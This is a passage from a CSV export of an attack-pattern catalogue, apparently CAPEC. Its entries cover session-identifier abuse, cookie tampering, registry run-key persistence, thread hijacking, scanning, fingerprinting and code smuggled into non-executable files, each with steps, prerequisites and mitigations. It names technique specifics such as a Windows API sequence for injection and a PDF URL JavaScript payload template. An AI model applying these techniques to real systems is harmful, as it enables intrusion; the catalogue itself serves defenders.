system's memory. [REF-714]::\",\"::732::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls:Code Signing::\",\"\",\n21,\"Exploitation of Trusted Identifiers\",Meta,Stable,\"An adversary guesses, obtains, or rides a trusted identifier (e.g. session ID, resource ID, cookie, etc.) to perform authorized actions under the guise of an authenticated user or service.\",\"\",High,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target, the adversary probes for cookies, session tokens, or entry points that bypass identifiers altogether.:TECHNIQUE:Spider all available pages:TECHNIQUE:Attack known bad interfaces:TECHNIQUE:Search outward-facing configuration and properties files for identifiers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Fetch samples] The adversary fetches many samples of identifiers. This may be through legitimate access (logging in, legitimate connections, etc.) or via systematic probing.:TECHNIQUE:An adversary makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An adversary makes authorized connections and records the session tokens or credentials issued.:TECHNIQUE:An adversary gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connection from it, attempting to gain the same privileges as a trusted system.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::\",\"::Server software must rely on weak identifier proof and/or verification schemes.::Identifiers must have long lifetimes and potential for reusability.::Server software must allow concurrent sessions to exist.::\",\"::SKILL:To achieve a direct connection with the weak or non-existent server session access control, and pose as an authorized user:LEVEL:Low::\",\"::Ability to deploy software on network.::Ability to communicate synchronously or asynchronously with server.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.::Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.::Implementation: If the identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.::Implementation: If the web or application server supports it, then encrypting and/or signing the identifier (such as cookie) can protect the ID if intercepted.::Design: Use strong session identifiers that are protected in transit and at rest.::Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.::Implementation: Verify authenticity of all identifiers at runtime.::\",\"::Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an adversary to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an adversary to exploit session IDs. A brute force attack involves an adversary repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an adversary can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The adversary can then use these variables and access the application.::For example, in a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or the process that wrote the message to the queue is authentic and authorized to do so.::\",\"::290::302::346::539::6::384::664::602::642::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134:ENTRY NAME:Access Token Manipulation::::TAXONOMY NAME:ATTACK:ENTRY ID:1528:ENTRY NAME:Steal Application Access Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1539:ENTRY NAME:Steal Web Session Cookie::\",\"\",\n227,\"Sustained Client Engagement\",Meta,Draft,\"An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource.\",\"\",,,\"\",\"\",\"::This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.::\",\"\",\"::To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.::\",\"\",\"\",\"::Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.::\",\"\",\"::400::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::\",\"\",\n233,\"Privilege Escalation\",Meta,Draft,\"An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::269::1264::1311::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n25,\"Forced Deadlock\",Meta,Stable,\"The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.\",\"\",Low,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary initiates an exploratory phase to get familiar with the system.::STEP:2:PHASE:Explore:DESCRIPTION:The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.::STEP:3:PHASE:Explore:DESCRIPTION:If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.::\",\"::The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [REF-101]::The target host exposes an API to the user.::\",\"::SKILL:This type of attack may be sophisticated and require knowledge about the system's resources and APIs.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful forced deadlock attack compromises the availability of the system by exhausting its available resources.::\",\"::Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).::For competing actions, use well-known libraries which implement synchronization.::\",\"::An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)::\",\"::412::567::662::667::833::1322::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.004:ENTRY NAME:Endpoint Denial of Service: Application or System Exploitation::\",\"\",\n251,\"Local Code Inclusion\",Standard,Stable,\"The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:175::\",\"\",\"::The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.::Some variants of this attack may require that old versions of some code files be present and in predictable locations.::\",\"\",\"::The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Through local code inclusion, the adversary compromises the integrity of the application.::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes.::\",\"::Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement a specific, allowlist approach.::\",\"\",\"::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1055:ENTRY NAME:Process Injection::\",\"\",\n267,\"Leverage Alternate Encoding\",Standard,Draft,\"An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:153::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Try to use different encodings of content in order to bypass validation routines.::\",\"::The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::\",\"::SKILL:An adversary can inject different representation of a filtered character in a different encoding.:LEVEL:Low::SKILL:An adversary may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::\",\"::Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488::Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.::\",\"::173::172::180::181::73::74::20::697::692::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027:ENTRY NAME:Obfuscated Files or Information::\",\"\",\n268,\"Audit Log Manipulation\",Standard,Draft,\"The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:161::\",\"\",\"::The target host is logging the action and data of the user.::The target host insufficiently protects access to the logs or logging mechanisms.::\",\"\",\"::The attacker must understand how the logging mechanism works. Optionally, the attacker must know the location and the format of individual entries of the log files.::\",\"\",\"\",\"\",\"\",\"::117::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1070:ENTRY NAME:Indicator Removal on Host::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Disable Windows Event Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.003:ENTRY NAME:Impair Defenses: Impair Command History Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.008:ENTRY NAME:Impair Defenses: Disable Cloud Logs::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Log Injection::\",\"\",\n270,\"Modification of Registry Run Keys\",Detailed,Stable,\"An adversary adds a new entry to the run keys in the Windows registry so that an application of their choosing is executed when a user logs in. In this way, the adversary can get their executable to operate and run on the target system with the authorized user's level of permissions. This attack is a good way for an adversary to run persistent spyware on a user's machine, such as a keylogger.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:203::NATURE:CanPrecede:CAPEC ID:568::NATURE:CanPrecede:CAPEC ID:529::NATURE:CanPrecede:CAPEC ID:646::NATURE:CanFollow:CAPEC ID:555::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target system] The adversary must first determine the system they wish to target. This attack only works on Windows.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the Windows registry.:TECHNIQUE:Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.:TECHNIQUE:Gain remote access to a system through a variety of means.::STEP:3:PHASE:Exploit:DESCRIPTION:[Modify Windows registry] The adversary will modify the Windows registry by adding a new entry to the run keys referencing a desired program. This program will be run whenever the user logs in.::\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Gain Privileges::\",\"::Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"::An adversary can place a malicious executable (RAT) on the target system and then configure it to automatically run when the user logs in to maintain persistence on the target system.::Through the modification of registry run keys the adversary can masquerade a malicious executable as a legitimate program.::\",\"::15::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1547.001:ENTRY NAME:Boot or Logon Autostart Execution: Registry Run Keys / Start Folder::::TAXONOMY NAME:ATTACK:ENTRY ID:1547.014:ENTRY NAME:Boot or Logon Autostart Execution: Active::\",\"\",\n292,\"Host Discovery\",Standard,Stable,\"An adversary sends a probe to an IP address to determine if the host is alive. Host discovery is one of the earliest phases of network reconnaissance. The adversary usually starts with a range of IP addresses belonging to a target network and uses various methods to determine if a host is present at that IP address. Host discovery is usually referred to as 'Ping' scanning using a sonar analogy. The goal is to send a packet through to the IP address and solicit a response from the host. As such, a 'ping' can be virtually any crafted packet whatsoever, provided the adversary can identify a functional host based on its response. An attack of this nature is usually carried out with a 'ping sweep,' where a particular kind of ping is sent to a range of IP addresses.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary requires logical access to the target network in order to carry out host discovery.::\",\"\",\"::The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1018:ENTRY NAME:Remote System Discovery::\",\"\",\n295,\"Timestamp Request\",Detailed,Stable,\"This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:292::\",\"\",\"::The ability to send a timestamp request to a remote target and receive a response.::\",\"\",\"::Scanners or utilities that provide the ability to send custom ICMP queries.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::\",\"\",\"::An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.::An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting::\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1124:ENTRY NAME:System Time Discovery::\",\"\",\n30,\"Hijacking a Privileged Thread of Execution\",Standard,Draft,\"An adversary hijacks a privileged thread of execution by injecting malicious code into a running process. By using a privleged thread to do their bidding, adversaries can evade process-based detection that would stop an attack that creates a new process. This can lead to an adversary gaining access to the process's memory and can also enable elevated privileges. The most common way to perform this attack is by suspending an existing thread and manipulating its memory.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:233::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target thread] The adversary determines the underlying system thread that is subject to user-control::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain handle to thread] The adversary then gains a handle to a process thread.:TECHNIQUE:Use the OpenThread API call in Windows on a known thread.:TECHNIQUE:Cause an exception in a java privileged block public function and catch it, or catch a normal signal. The thread is then hanging and the adversary can attempt to gain a handle to it.::STEP:3:PHASE:Experiment:DESCRIPTION:[Alter process memory] Once the adversary has a handle to the target thread, they will suspend the thread and alter the memory using native OS calls.:TECHNIQUE:On Windows, use SuspendThread followed by VirtualAllocEx, WriteProcessMemory, and SetThreadContext.::STEP:4:PHASE:Exploit:DESCRIPTION:[Resume thread execution] Once the process memory has been altered to execute malicious code, the thread is then resumed.:TECHNIQUE:On Windows, use ResumeThread.::\",\"::The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users::In order to feasibly execute this class of attacks, the adversary must have the ability to hijack a privileged thread. This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or calling native OS calls that can suspend and alter process memory. This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.::\",\"::SKILL:Hijacking a thread involves knowledge of how processes and threads function on the target platform, the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack. The adversary needs to be able to latch onto a privileged thread. The adversary does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the adversary's malicious code. This is the case even if the adversary conducts the attack remotely.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.::Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.::\",\"::Adversary targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread (e.g., a system call). The adversary could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.::\",\"::270::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1055.003:ENTRY NAME:Process Injection: Thread Execution Hijacking::\",\"\",\n300,\"Port Scanning\",Standard,Stable,\"An adversary uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary requires logical access to the target's network in order to carry out this type of attack.::\",\"\",\"::The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1046:ENTRY NAME:Network Service Scanning::\",\"TYPE:Other:NOTE:There are four types of port status that this type of attack aims to identify: 1) Open Port: The port is open and a firewall does not block access to the port, 2) Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port, 3) Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified, and 4) Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified.::\",\n309,\"Network Topology Mapping\",Standard,Draft,\"An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:169::NATURE:CanPrecede:CAPEC ID:664::\",\"\",\"::None::\",\"\",\"::Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1016:ENTRY NAME:System Network Configuration Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1049:ENTRY NAME:System Network Connections Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1590:ENTRY NAME:Gather Victim Network Information::\",\"\",\n31,\"Accessing/Intercepting/Modifying HTTP Cookies\",Detailed,Draft,\"This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:39::NATURE:ChildOf:CAPEC ID:157::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.:TECHNIQUE:Sniff cookie using a network sniffer such as Wireshark:TECHNIQUE:Obtain cookie using a utility such as the Firefox Cookie Manager, Chrome DevTools or AnEC Cookie Editor.:TECHNIQUE:Steal cookie via a cross-site scripting attack.:TECHNIQUE:Guess cookie contents if it contains predictable information.::STEP:2:PHASE:Experiment:DESCRIPTION:[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.:TECHNIQUE:If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.:TECHNIQUE:Analyze the cookie's contents to determine whether it contains any sensitive information.::STEP:3:PHASE:Experiment:DESCRIPTION:[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.:TECHNIQUE:Modify logical parts of cookie and send it back to server to observe the effects.:TECHNIQUE:Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.:TECHNIQUE:Modify cookie bitwise and send it back to server to observe the effects.:TECHNIQUE:Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a points balance for a given user where the points have some value. The user may spend their points and then replace their cookie with an older one to restore their balance.::\",\"::Target server software must be a HTTP daemon that relies on cookies.::The cookies must contain sensitive information.::The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply.::\",\"::SKILL:To overwrite session cookie data, and submit targeted attacks via HTTP:LEVEL:Low::SKILL:Exploiting a remote buffer overflow generated by attack:LEVEL:High::\",\"::A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Use input validation for cookies::Design: Generate and validate MAC for cookies::Implementation: Use SSL/TLS to protect cookie in transit::Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software.::\",\"::There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353::\",\"::565::302::311::113::539::20::315::384::472::602::642::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1539:ENTRY NAME:Steal Web Session Cookie::\",\"\",\n312,\"Active OS Fingerprinting\",Standard,Stable,\"An adversary engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:224::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1082:ENTRY NAME:System Information Discovery::\",\"\",\n313,\"Passive OS Fingerprinting\",Standard,Stable,\"An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:224::\",\"\",\"::The ability to monitor network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1082:ENTRY NAME:System Information Discovery::\",\"\",\n35,\"Leverage Executable Code in Non-Executable Files\",Detailed,Draft,\"An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:636::NATURE:PeerOf:CAPEC ID:23::NATURE:PeerOf:CAPEC ID:75::\",\"\",\"::The attacker must have the ability to modify non-executable files consumed by the target software.::\",\"::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::\",\"::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.::Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute.::\",\"::Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix cp command can be rerouted to rm or other standard command so the user's intention is subverted.::The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.::Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/) http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here The 